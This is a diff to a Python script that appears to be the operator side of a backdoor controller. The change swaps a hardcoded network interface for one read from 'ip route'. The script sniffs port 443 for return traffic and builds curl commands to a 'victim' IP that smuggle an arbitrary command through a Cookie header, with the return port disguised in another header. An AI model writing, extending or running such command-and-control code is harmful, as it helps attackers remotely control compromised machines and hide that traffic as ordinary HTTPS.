@@ -1,11 +1,13 @@
 #!/usr/bin/python3
 from scapy.all import IP, TCP, Raw, sniff
 import threading
-from os import system
+from os import system, popen
 from time import sleep
 RETURN_PORT = 443
 
-IF_NAME="enp0s3" # ens160
+def get_IF_NAME():
+    tokens = popen("ip route | grep default", 'r').read().split(" ")
+    return tokens[tokens.index("dev")+1]
 
 keep_sniffing = True
 def process_packet(packet):
@@ -18,7 +20,7 @@ def process_packet(packet):
             keep_sniffing = False
 
 def start_sniffing():
-    sniff(iface=IF_NAME, filter=f"tcp port {RETURN_PORT}", prn=process_packet, store=0)
+    sniff(iface=get_IF_NAME(), filter=f"tcp port {RETURN_PORT}", prn=process_packet, store=0)
 
 def send_command(vic_ip, cmd):
     print(fr"curl {vic_ip} -A \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/420.69 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\" -H \"Cookie: ${cmd}\" -H \"Upgrade-Insecure-Requests: {RETURN_PORT}\" > /dev/null 2>&1")
